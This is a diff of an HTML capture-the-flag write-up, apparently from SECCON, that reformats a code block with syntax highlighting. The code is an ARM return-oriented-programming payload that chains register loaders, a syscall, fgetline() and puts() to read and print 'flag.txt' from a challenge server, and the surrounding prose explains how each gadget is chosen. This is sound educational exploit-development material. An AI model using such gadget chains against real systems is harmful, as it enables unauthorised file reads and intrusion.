@@ -155,16 +155,15 @@ message += '\x4c\x42\x00\x00' + 'xxxx' * 3 + '\x14\x40\x00\x00' + '/bin/ls\x00' 
 
 <p>We’re almost there! The data has now been read, all that remains is to print it. For that purpose we can use <code>puts()</code> @0x4268. Here is the final problem: how to set R0 to point to the address of the buffer? Well… I don’t think we can, however we can put something in R1 instead and jump to 0x425C (skip <code>MOV R1, R0</code>)… Now, how to set R1? Go back to square one! In <code>check_pwd()</code>, the last instruction @0x42B0 pops R1-R6/R11/PC, so we can just jump to it as a new register loader! That way, we put the address of the buffer in R1, the address of <code>puts()</code> in PC, and <em>at last</em> we’re done. Here is the full message:</p>
 
-<pre><code>#         R1                   R2                   R3                   R4-R5        R6 =&gt; R0             R11
-#         (arg 1 = &amp;"flag.txt") (arg 2 = O_RDONLY)  (arg 3 = 0)                       (syscall number)
-message = '\x30\xf0\xff\x1f' + '\x00\x00\x00\x00' + '\x00\x00\x00\x00' + 'xxxx' * 2 + '\x05\x00\x00\x00' + 'xxxx'
-#          "Regs loader"        R4-R6        syscall()            fgetline()           "Regs loader #2"
-#                                            (w/ ret from stack)
-message += '\x4c\x42\x00\x00' + 'xxxx' * 3 + '\x28\x40\x00\x00' + '\x60\x42\x00\x00' + '\xb0\x42\x00\x00'
-#          R1                   R2-6, R11    puts()               @0x1FFFF030
-#          (arg 1 = &amp;"flag.txt")
-message += '\x30\xf0\xff\x1f' + 'xxxx' * 6 + '\x70\x42\x00\x00' + 'flag.txt\x00' + '\n'
-</code></pre>
+<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="c">#         R1                   R2                   R3                   R4-R5        R6 =&gt; R0             R11</span>
+    <span class="c">#         (arg 1 = &amp;&quot;flag.txt&quot;) (arg 2 = O_RDONLY)  (arg 3 = 0)                       (syscall number)</span>
+    <span class="nv">message</span> <span class="o">=</span> <span class="s1">&#39;\x30\xf0\xff\x1f&#39;</span> + <span class="s1">&#39;\x00\x00\x00\x00&#39;</span> + <span class="s1">&#39;\x00\x00\x00\x00&#39;</span> + <span class="s1">&#39;xxxx&#39;</span> * <span class="m">2</span> + <span class="s1">&#39;\x05\x00\x00\x00&#39;</span> + <span class="s1">&#39;xxxx&#39;</span>
+    <span class="c">#          &quot;Regs loader&quot;        R4-R6        syscall()            fgetline()           &quot;Regs loader #2&quot;</span>
+    <span class="c">#                                            (w/ ret from stack)</span>
+    message +<span class="o">=</span> <span class="s1">&#39;\x4c\x42\x00\x00&#39;</span> + <span class="s1">&#39;xxxx&#39;</span> * <span class="m">3</span> + <span class="s1">&#39;\x28\x40\x00\x00&#39;</span> + <span class="s1">&#39;\x60\x42\x00\x00&#39;</span> + <span class="s1">&#39;\xb0\x42\x00\x00&#39;</span>
+    <span class="c">#          R1                   R2-6, R11    puts()               @0x1FFFF030</span>
+    <span class="c">#          (arg 1 = &amp;&quot;flag.txt&quot;)</span>
+    message +<span class="o">=</span> <span class="s1">&#39;\x30\xf0\xff\x1f&#39;</span> + <span class="s1">&#39;xxxx&#39;</span> * <span class="m">6</span> + <span class="s1">&#39;\x70\x42\x00\x00&#39;</span> + <span class="s1">&#39;flag.txt\x00&#39;</span> + <span class="s1">&#39;\n&#39;</span></code></pre></div>
 
 <p>And with this message, the miracle finally happens: the server replies with the contents of the file, i.e. the token ‘SECCON{TeaBreakAtWork}’.</p>
 
